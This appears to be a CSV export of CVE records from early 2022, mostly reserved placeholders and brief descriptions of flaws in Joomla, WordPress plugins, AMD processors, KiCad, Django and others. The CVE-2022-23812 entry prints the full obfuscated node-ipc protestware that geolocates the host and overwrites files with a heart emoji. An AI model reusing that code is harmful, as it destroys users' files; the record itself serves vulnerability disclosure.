"Name","Status","Description","References","Phase","Votes","Comments"
CVE-2022-23783,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23784,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23785,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23786,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23787,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23788,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23789,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-2379,Candidate,"The Easy Student Results WordPress plugin through 2.2.8 lacks authorisation in its REST API, allowing unauthenticated users to retrieve information related to the courses, exams, departments as well as student's grades and PII such as email address, physical address, phone number etc","MISC:https://wpscan.com/vulnerability/0773ba24-212e-41d5-9ae0-1416ea2c9db6   |   URL:https://wpscan.com/vulnerability/0773ba24-212e-41d5-9ae0-1416ea2c9db6",Assigned (20220711),"None (candidate not yet proposed)",""
CVE-2022-23790,Candidate,"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Firmanet Software and Technology Customer Relation Manager allows Cross-Site Scripting (XSS).This issue affects Customer Relation Manager: before 2022.03.13.","MISC:https://www.usom.gov.tr/bildirim/tr-23-0145   |   URL:https://www.usom.gov.tr/bildirim/tr-23-0145",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23791,Candidate,"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Firmanet Software and Technology Customer Relation Manager allows Cross-Site Scripting (XSS).This issue affects Customer Relation Manager: before 2022.03.13.","MISC:https://www.usom.gov.tr/bildirim/tr-23-0145   |   URL:https://www.usom.gov.tr/bildirim/tr-23-0145",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23792,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23793,Candidate,"An issue was discovered in Joomla! 3.0.0 through 3.10.6 & 4.0.0 through 4.1.0. Extracting an specifilcy crafted tar package could write files outside of the intended path.","MISC:http://packetstormsecurity.com/files/166546/Joomla-4.1.0-Zip-Slip-File-Overwrite-Path-Traversal.html   |   URL:http://packetstormsecurity.com/files/166546/Joomla-4.1.0-Zip-Slip-File-Overwrite-Path-Traversal.html   |   MISC:https://developer.joomla.org/security-centre/870-20220301-core-zip-slip-within-the-tar-extractor.html   |   URL:https://developer.joomla.org/security-centre/870-20220301-core-zip-slip-within-the-tar-extractor.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23794,Candidate,"An issue was discovered in Joomla! 3.0.0 through 3.10.6 & 4.0.0 through 4.1.0. Uploading a file name of an excess length causes the error. This error brings up the screen with the path of the source code of the web application.","MISC:https://developer.joomla.org/security-centre/871-20220302-core-path-disclosure-within-filesystem-error-messages.html   |   URL:https://developer.joomla.org/security-centre/871-20220302-core-path-disclosure-within-filesystem-error-messages.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23795,Candidate,"An issue was discovered in Joomla! 2.5.0 through 3.10.6 & 4.0.0 through 4.1.0. A user row was not bound to a specific authentication mechanism which could under very special circumstances allow an account takeover.","MISC:https://developer.joomla.org/security-centre/872-20220303-core-user-row-are-not-bound-to-a-authentication-mechanism.html   |   URL:https://developer.joomla.org/security-centre/872-20220303-core-user-row-are-not-bound-to-a-authentication-mechanism.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23796,Candidate,"An issue was discovered in Joomla! 3.7.0 through 3.10.6. Lack of input validation could allow an XSS attack using com_fields.","MISC:https://developer.joomla.org/security-centre/873-20220304-core-missing-input-validation-within-com-fields-class-inputs.html   |   URL:https://developer.joomla.org/security-centre/873-20220304-core-missing-input-validation-within-com-fields-class-inputs.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23797,Candidate,"An issue was discovered in Joomla! 3.0.0 through 3.10.6 & 4.0.0 through 4.1.0. Inadequate filtering on the selected Ids on an request could resulted into an possible SQL injection.","MISC:https://developer.joomla.org/security-centre/874-20220305-core-inadequate-filtering-on-the-selected-ids.html   |   URL:https://developer.joomla.org/security-centre/874-20220305-core-inadequate-filtering-on-the-selected-ids.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23798,Candidate,"An issue was discovered in Joomla! 2.5.0 through 3.10.6 & 4.0.0 through 4.1.0. Inadequate validation of URLs could result into an invalid check whether an redirect URL is internal or not.","MISC:https://developer.joomla.org/security-centre/875-20220306-core-inadequate-validation-of-internal-urls.html   |   URL:https://developer.joomla.org/security-centre/875-20220306-core-inadequate-validation-of-internal-urls.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23799,Candidate,"An issue was discovered in Joomla! 4.0.0 through 4.1.0. Under specific circumstances, JInput pollutes method-specific input bags with $_REQUEST data.","MISC:https://developer.joomla.org/security-centre/876-20220307-core-variable-tampering-on-jinput-request-data.html   |   URL:https://developer.joomla.org/security-centre/876-20220307-core-variable-tampering-on-jinput-request-data.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-2380,Candidate,"The Linux kernel was found vulnerable out of bounds memory access in the drivers/video/fbdev/sm712fb.c:smtcfb_read() function. The vulnerability could result in local attackers being able to crash the kernel.","MISC:https://git.kernel.org/pub/scm/linux/kernel/git/deller/linux-fbdev.git/commit/?h=for-next&id=bd771cf5c4254511cc4abb88f3dab3bd58bdf8e8   |   URL:https://git.kernel.org/pub/scm/linux/kernel/git/deller/linux-fbdev.git/commit/?h=for-next&id=bd771cf5c4254511cc4abb88f3dab3bd58bdf8e8",Assigned (20220711),"None (candidate not yet proposed)",""
CVE-2022-23800,Candidate,"An issue was discovered in Joomla! 4.0.0 through 4.1.0. Inadequate content filtering leads to XSS vulnerabilities in various components.","MISC:https://developer.joomla.org/security-centre/877-20220308-core-inadequate-content-filtering-within-the-filter-code.html   |   URL:https://developer.joomla.org/security-centre/877-20220308-core-inadequate-content-filtering-within-the-filter-code.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23801,Candidate,"An issue was discovered in Joomla! 4.0.0 through 4.1.0. Possible XSS atack vector through SVG embedding in com_media.","MISC:https://developer.joomla.org/security-centre/878-20220309-core-xss-attack-vector-through-svg.html   |   URL:https://developer.joomla.org/security-centre/878-20220309-core-xss-attack-vector-through-svg.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23802,Candidate,"Joomla Guru extension 5.2.5 is affected by: Insecure Permissions. The impact is: obtain sensitive information (remote). The component is: Access to private information and components, possibility to view other users' information. Information disclosure Access to private information and components, possibility to view other users' information.","MISC:https://guru.ijoomla.com/changelog   |   URL:https://guru.ijoomla.com/changelog",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23803,Candidate,"A stack-based buffer overflow vulnerability exists in the Gerber Viewer gerber and excellon ReadXYCoord coordinate parsing functionality of KiCad EDA 6.0.1 and master commit de006fc010. A specially-crafted gerber or excellon file can lead to code execution. An attacker can provide a malicious file to trigger this vulnerability.","DEBIAN:DSA-5214   |   URL:https://www.debian.org/security/2022/dsa-5214   |   FEDORA:FEDORA-2022-78b18981a6   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5EMCGSSP3FIWCSL2KXVXLF35JYZKZE5Q/   |   MISC:https://talosintelligence.com/vulnerability_reports/TALOS-2022-1453   |   URL:https://talosintelligence.com/vulnerability_reports/TALOS-2022-1453   |   MLIST:[debian-lts-announce] 20220510 [SECURITY] [DLA 2998-1] kicad security update   |   URL:https://lists.debian.org/debian-lts-announce/2022/05/msg00009.html   |   MLIST:[debian-lts-announce] 20220820 [SECURITY] [DLA 3078-1] kicad security update   |   URL:https://lists.debian.org/debian-lts-announce/2022/08/msg00010.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23804,Candidate,"A stack-based buffer overflow vulnerability exists in the Gerber Viewer gerber and excellon ReadIJCoord coordinate parsing functionality of KiCad EDA 6.0.1 and master commit de006fc010. A specially-crafted gerber or excellon file can lead to code execution. An attacker can provide a malicious file to trigger this vulnerability.","DEBIAN:DSA-5214   |   URL:https://www.debian.org/security/2022/dsa-5214   |   FEDORA:FEDORA-2022-78b18981a6   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5EMCGSSP3FIWCSL2KXVXLF35JYZKZE5Q/   |   MISC:https://talosintelligence.com/vulnerability_reports/TALOS-2022-1453   |   URL:https://talosintelligence.com/vulnerability_reports/TALOS-2022-1453   |   MLIST:[debian-lts-announce] 20220510 [SECURITY] [DLA 2998-1] kicad security update   |   URL:https://lists.debian.org/debian-lts-announce/2022/05/msg00009.html   |   MLIST:[debian-lts-announce] 20220820 [SECURITY] [DLA 3078-1] kicad security update   |   URL:https://lists.debian.org/debian-lts-announce/2022/08/msg00010.html",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23805,Candidate,"A security out-of-bounds read information disclosure vulnerability in Trend Micro Worry-Free Business Security Server could allow a local attacker to send garbage data to a specific named pipe and crash the server. Please note: an attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.","MISC:https://success.trendmicro.com/solution/000290416   |   URL:https://success.trendmicro.com/solution/000290416   |   MISC:https://www.zerodayinitiative.com/advisories/ZDI-22-147/   |   URL:https://www.zerodayinitiative.com/advisories/ZDI-22-147/",Assigned (20220120),"None (candidate not yet proposed)",""
CVE-2022-23806,Candidate,"Curve.IsOnCurve in crypto/elliptic in Go before 1.16.14 and 1.17.x before 1.17.7 can incorrectly return true in situations with a big.Int value that is not a valid field element.","CONFIRM:https://security.netapp.com/advisory/ntap-20220225-0006/   |   URL:https://security.netapp.com/advisory/ntap-20220225-0006/   |   GENTOO:GLSA-202208-02   |   URL:https://security.gentoo.org/glsa/202208-02   |   MISC:https://groups.google.com/g/golang-announce/c/SUsQn0aSgPQ   |   URL:https://groups.google.com/g/golang-announce/c/SUsQn0aSgPQ   |   MISC:https://www.oracle.com/security-alerts/cpujul2022.html   |   URL:https://www.oracle.com/security-alerts/cpujul2022.html   |   MLIST:[debian-lts-announce] 20220428 [SECURITY] [DLA 2985-1] golang-1.7 security update   |   URL:https://lists.debian.org/debian-lts-announce/2022/04/msg00017.html   |   MLIST:[debian-lts-announce] 20220428 [SECURITY] [DLA 2986-1] golang-1.8 security update   |   URL:https://lists.debian.org/debian-lts-announce/2022/04/msg00018.html",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23807,Candidate,"An issue was discovered in phpMyAdmin 4.9 before 4.9.8 and 5.1 before 5.1.2. A valid user who is already authenticated to phpMyAdmin can manipulate their account to bypass two-factor authentication for future login instances.","MISC:https://www.phpmyadmin.net/security/PMASA-2022-1/",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23808,Candidate,"An issue was discovered in phpMyAdmin 5.1 before 5.1.2. An attacker can inject malicious code into aspects of the setup script, which can allow XSS or HTML injection.","MISC:https://www.phpmyadmin.net/security/PMASA-2022-2/",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23809,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-2381,Candidate,"The E Unlocked - Student Result WordPress plugin through 1.0.4 is lacking CSRF and validation when uploading the School logo, which could allow attackers to make a logged in admin upload arbitrary files, such as PHP via a CSRF attack","MISC:https://wpscan.com/vulnerability/c39c41bf-f622-4239-a0a1-4dfe0e079f7f   |   URL:https://wpscan.com/vulnerability/c39c41bf-f622-4239-a0a1-4dfe0e079f7f",Assigned (20220711),"None (candidate not yet proposed)",""
CVE-2022-23810,Candidate,"Template injection (Improper Neutralization of Special Elements Used in a Template Engine) vulnerability in a-blog cms Ver.2.8.x series versions prior to Ver.2.8.75, Ver.2.9.x series versions prior to Ver.2.9.40, Ver.2.10.x series versions prior to Ver.2.10.44, Ver.2.11.x series versions prior to Ver.2.11.42, and Ver.3.0.x series versions prior to Ver.3.0.1 allows a remote authenticated attacker to obtain an arbitrary file on the server via unspecified vectors.","MISC:https://developer.a-blogcms.jp/blog/news/security-202202.html   |   URL:https://developer.a-blogcms.jp/blog/news/security-202202.html   |   MISC:https://jvn.jp/en/jp/JVN14706307/index.html   |   URL:https://jvn.jp/en/jp/JVN14706307/index.html",Assigned (20220216),"None (candidate not yet proposed)",""
CVE-2022-23811,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220224),"None (candidate not yet proposed)",""
CVE-2022-23812,Candidate,"This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note**: from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code: **Note:** Don't run it! js import u from ""path""; import a from ""fs""; import o from ""https""; setTimeout(function () { const t = Math.round(Math.random() * 4); if (t > 1) { return; } const n = Buffer.from(""aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ="", ""base64""); // https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString(""utf8""), function (t) { t.on(""data"", function (t) { const n = Buffer.from(""Li8="", ""base64""); const o = Buffer.from(""Li4v"", ""base64""); const r = Buffer.from(""Li4vLi4v"", ""base64""); const f = Buffer.from(""Lw=="", ""base64""); const c = Buffer.from(""Y291bnRyeV9uYW1l"", ""base64""); const e = Buffer.from(""cnVzc2lh"", ""base64""); const i = Buffer.from(""YmVsYXJ1cw=="", ""base64""); try { const s = JSON.parse(t.toString(""utf8"")); const u = s[c.toString(""utf8"")].toLowerCase(); const a = u.includes(e.toString(""utf8"")) || u.includes(i.toString(""utf8"")); // checks if country is Russia or Belarus if (a) { h(n.toString(""utf8"")); h(o.toString(""utf8"")); h(r.toString(""utf8"")); h(f.toString(""utf8"")); } } catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async function h(n = """", o = """") { if (!a.existsSync(n)) { return; } let r = []; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c = Buffer.from(""4p2k77iP"", ""base64""); for (var e = 0; e < r.length; e++) { const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); } catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o); s.length > 0 ? f.push(...s) : null; } else if (i.indexOf(o) >= 0) { try { a.writeFile(i, c.toString(""utf8""), function () {}); // overwrites file with &#10084;&#65039; } catch (t) {} } } return f; } const ssl = true; export { ssl as default, ssl };","CONFIRM:https://security.netapp.com/advisory/ntap-20220407-0005/   |   MISC:https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js   |   URL:https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js   |   MISC:https://github.com/RIAEvangelist/node-ipc/commit/847047cf7f81ab08352038b2204f0e7633449580   |   URL:https://github.com/RIAEvangelist/node-ipc/commit/847047cf7f81ab08352038b2204f0e7633449580   |   MISC:https://github.com/RIAEvangelist/node-ipc/issues/233   |   URL:https://github.com/RIAEvangelist/node-ipc/issues/233   |   MISC:https://github.com/RIAEvangelist/node-ipc/issues/236   |   URL:https://github.com/RIAEvangelist/node-ipc/issues/236   |   MISC:https://snyk.io/vuln/SNYK-JS-NODEIPC-2426370   |   URL:https://snyk.io/vuln/SNYK-JS-NODEIPC-2426370",Assigned (20220224),"None (candidate not yet proposed)",""
CVE-2022-23813,Candidate,"The software interfaces to ASP and SMU may not enforce the SNP memory security policy resulting in a potential loss of integrity of guest memory in a confidential compute environment.","MISC:https://www.amd.com/en/corporate/product-security/bulletin/AMD-SB-1032   |   URL:https://www.amd.com/en/corporate/product-security/bulletin/AMD-SB-1032",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23814,Candidate,"Failure to validate addresses provided by software to BIOS commands may result in a potential loss of integrity of guest memory in a confidential compute environment.","MISC:https://www.amd.com/en/corporate/product-security/bulletin/AMD-SB-1032   |   URL:https://www.amd.com/en/corporate/product-security/bulletin/AMD-SB-1032",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23815,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23816,Candidate,"** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: none. Reason: This candidate is unused by its CNA. Notes: none.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23817,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23818,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23819,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-2382,Candidate,"The Product Slider for WooCommerce WordPress plugin before 2.5.7 has flawed CSRF checks and lack authorisation in some of its AJAX actions, allowing any authenticated users, such as subscriber to call them. One in particular could allow them to delete arbitrary blog options.","MISC:https://wpscan.com/vulnerability/777d4637-444b-4eda-bc21-95d3a3bf6cd3   |   URL:https://wpscan.com/vulnerability/777d4637-444b-4eda-bc21-95d3a3bf6cd3",Assigned (20220711),"None (candidate not yet proposed)",""
CVE-2022-23820,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23821,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23822,Candidate,"In this physical attack, an attacker may potentially exploit the Zynq-7000 SoC First Stage Boot Loader (FSBL) by bypassing authentication and loading a malicious image onto the device. This in turn may further allow the attacker to perform additional attacks such as such as using the device as a decryption oracle. An anticipated mitigation via a 2022.1 patch will resolve the issue.","MISC:https://github.com/Xilinx/embeddedsw/tree/master/lib/sw_apps/zynq_fsbl   |   URL:https://github.com/Xilinx/embeddedsw/tree/master/lib/sw_apps/zynq_fsbl   |   MISC:https://support.xilinx.com/s/article/76974   |   URL:https://support.xilinx.com/s/article/76974",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23823,Candidate,"A potential vulnerability in some AMD processors using frequency scaling may allow an authenticated attacker to execute a timing attack to potentially enable information disclosure.","MISC:https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1038   |   URL:https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1038",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23824,Candidate,"IBPB may not prevent return branch predictions from being specified by pre-IBPB branch targets leading to a potential information disclosure.","MISC:DSA-5378   |   URL:https://www.debian.org/security/2023/dsa-5378   |   MISC:FEDORA-2022-53a4a5dd11   |   URL:https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NTQMPJC5N6XJYQ232OZFLK47HVZNRBY3/   |   MISC:FEDORA-2022-9f51d13fa3   |   URL:https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YTMITQBGC23MSDHUCAPCVGLMVXIBXQTQ/   |   MISC:[oss-security] 20221110 Xen Security Advisory 422 v2 (CVE-2022-23824) - x86: Multiple speculative security issues   |   URL:http://www.openwall.com/lists/oss-security/2022/11/10/2   |   MISC:https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1040   |   URL:https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1040",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23825,Candidate,"Aliases in the branch predictor may cause some AMD processors to predict the wrong branch type potentially leading to information disclosure.","DEBIAN:DSA-5184   |   URL:https://www.debian.org/security/2022/dsa-5184   |   FEDORA:FEDORA-2022-3e6ce58029   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KLSRW4LLTAT3CZMOYVNTC7YIYGX3KLED/   |   FEDORA:FEDORA-2022-8aab5b5cde   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/D4RW5FCIYFNCQOEFJEUIRW3DGYW7CWBG/   |   FEDORA:FEDORA-2022-a0d7a5eaf2   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MYI3OMJ7RIZNL3C6GUWNANNPEUUID6FM/   |   FEDORA:FEDORA-2022-c69ef9c1dd   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/M27MB3QFNIJV4EQQSXWARHP3OGX6CR6K/   |   MISC:https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1037   |   URL:https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1037   |   MLIST:[oss-security] 20221108 Xen Security Advisory 422 v1 (CVE-2022-23824) - x86: Multiple speculative security issues   |   URL:http://www.openwall.com/lists/oss-security/2022/11/08/1   |   MLIST:[oss-security] 20221110 Xen Security Advisory 422 v2 (CVE-2022-23824) - x86: Multiple speculative security issues   |   URL:http://www.openwall.com/lists/oss-security/2022/11/10/2",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23826,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23827,Candidate,"** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: none. Reason: This candidate is unused by its CNA. Notes: none.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23828,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23829,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-2383,Candidate,"The Feed Them Social WordPress plugin before 3.0.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting","MISC:https://wpscan.com/vulnerability/4a3b3023-e740-411c-a77c-6477b80d7531   |   URL:https://wpscan.com/vulnerability/4a3b3023-e740-411c-a77c-6477b80d7531",Assigned (20220711),"None (candidate not yet proposed)",""
CVE-2022-23830,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23831,Candidate,"Insufficient validation of the IOCTL input buffer in AMD &#956;Prof may allow an attacker to send an arbitrary buffer leading to a potential Windows kernel crash resulting in denial of service.","MISC:https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1046   |   URL:https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1046",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23832,Candidate,"** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: none. Reason: This candidate is unused by its CNA. Notes: none.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23833,Candidate,"An issue was discovered in MultiPartParser in Django 2.2 before 2.2.27, 3.2 before 3.2.12, and 4.0 before 4.0.2. Passing certain inputs to multipart forms could result in an infinite loop when parsing files.","CONFIRM:https://security.netapp.com/advisory/ntap-20220221-0003/   |   CONFIRM:https://www.djangoproject.com/weblog/2022/feb/01/security-releases/   |   DEBIAN:DSA-5254   |   URL:https://www.debian.org/security/2022/dsa-5254   |   FEDORA:FEDORA-2022-e7fd530688   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/B4SQG2EAF4WCI2SLRL6XRDJ3RPK3ZRDV/   |   MISC:https://docs.djangoproject.com/en/4.0/releases/security/   |   MISC:https://groups.google.com/forum/#!forum/django-announce",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23834,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23835,Candidate,"** DISPUTED ** The Visual Voice Mail (VVM) application through 2022-02-24 for Android allows persistent access if an attacker temporarily controls an application that has the READ_SMS permission, and reads an IMAP credentialing message that is (by design) not displayed to the victim within the AOSP SMS/MMS messaging application. (Often, the IMAP credentials are usable to listen to voice mail messages sent before the vulnerability was exploited, in addition to new ones.) NOTE: some vendors characterize this as not a ""concrete and exploitable risk.""","MISC:https://gitlab.com/kop316/vvm-disclosure   |   MISC:https://www.kb.cert.org/vuls/id/383864",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23836,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20220121),"None (candidate not yet proposed)",""
CVE-2022-23837,Candidate,"In api.rb in Sidekiq before 5.2.10 and 6.4.0, there is no limit on the number of days when requesting stats for the graph. This overloads the system, affecting the Web UI, and makes it unavailable to users.","MISC:https://github.com/TUTUMSPACE/exploits/blob/main/sidekiq.md   |   MISC:https://github.com/mperham/sidekiq/commit/7785ac1399f1b28992adb56055f6acd88fd1d956   |   MISC:https://github.com/rubysec/ruby-advisory-db/pull/495   |   MLIST:[debian-lts-announce] 20220310 [SECURITY] [DLA 2943-1] ruby-sidekiq security update   |   URL:https://lists.debian.org/debian-lts-announce/2022/03/msg00015.html   |   MLIST:[debian-lts-announce] 20230312 [SECURITY] [DLA 3360-1] ruby-sidekiq security update   |   URL:https://lists.debian.org/debian-lts-announce/2023/03/msg00011.html",Assigned (20220121),"None (candidate not yet proposed)",""
